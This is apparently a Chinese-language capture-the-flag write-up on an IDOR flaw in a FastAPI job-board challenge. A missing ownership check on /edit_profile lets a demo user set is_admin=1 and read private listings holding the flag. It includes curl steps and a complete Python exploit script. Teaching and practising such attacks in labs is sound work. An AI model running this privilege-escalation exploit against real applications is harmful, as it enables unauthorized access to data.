
## 1、题目描述

FastAPI 应用在更新公司资料时存在 IDOR，允许普通用户通过提交表单将自己设为管理员，从而查看私有职位（职位描述中包含 flag）。

## 2、知识点

- IDOR（授权校验缺失）

- JWT（认证，sub 存 company id）

- 表单提交与会话 cookie 利用

## 3、解题思路（要点）

- 登录 demo 账号获取 cookie 中的 JWT。

- POST `/edit_profile/{company_id}` 不校验 `token.sub == company_id` 且直接写入 `is_admin`，可通过提交 `is_admin=1` 提权。

- 访问 `/company/{company_id}/jobs`，提权后会返回私有职位，职位描述即 flag。

（关键位置：`main.py` 中 POST `/edit_profile/{company_id}` 缺少 `if token_company_id != company_id` 校验。）

  

## 4、解题步骤

1) 登录并保存 cookie：

```bash

curl -i -c cookiejar -X POST -F "username=demo" -F "password=demo" http://ip32772/token

```

2) 通过edit_profile路由提权（携带 cookie）：


```bash

curl -b cookiejar -X POST -F "name=demo" -F "is_admin=1" http://ip32772/edit_profile/1

```


3) 访问 jobs 页面查看私有职位：

  
```bash

curl -b cookiejar http://ip32772/company/1/jobs

```

页面会包含私有条目，例如：`secret:FLAG`。

  

## 5、exp（脚本）

将以下脚本保存为 `exploit.py` 并运行 `python exploit.py`：

  

```python
import httpx
from bs4 import BeautifulSoup

BASE = "http://ip32772"

with httpx.Client(follow_redirects=True) as client:
    # 1) login as demo
    r = client.post(f"{BASE}/token", data={"username": "demo", "password": "demo"})
    print("Login status:", r.status_code)
    # find the company id from redirect final url (/company/{id}/jobs)
    try:
        path = r.url.path  # e.g. /company/1/jobs
        parts = path.strip('/').split('/')
        company_id = int(parts[1]) if parts[0] == 'company' else 1
    except Exception:
        company_id = 1

    print("Determined company_id:", company_id)

    # 2) craft POST to promote ourselves to admin (IDOR exploit)
    update_data = {"name": "demo", "is_admin": "1"}
    r2 = client.post(f"{BASE}/edit_profile/{company_id}", data=update_data)
    print("Update profile status:", r2.status_code)

    # 3) fetch jobs page for our company
    r3 = client.get(f"{BASE}/company/{company_id}/jobs")
    print("Jobs page status:", r3.status_code)

    # 4) parse HTML to extract jobs and show potential flag
    soup = BeautifulSoup(r3.text, 'html.parser')
    items = soup.select('ul.list-group li.list-group-item')
    print("Found jobs:")
    for it in items:
        text = it.get_text().strip()
        print('-', text)

    # try to find any long text that looks like FLAG
    body = r3.text
    if 'FLAG' in body or 'flag' in body.lower():
        print('\nPossible flag found in page:')
        # print a short excerpt around the word
        idx = body.lower().find('flag')
        start = max(0, idx-200)
        end = min(len(body), idx+400)
        print(body[start:end])
    else:
        print('\nNo obvious flag string found in page response.')

```

  
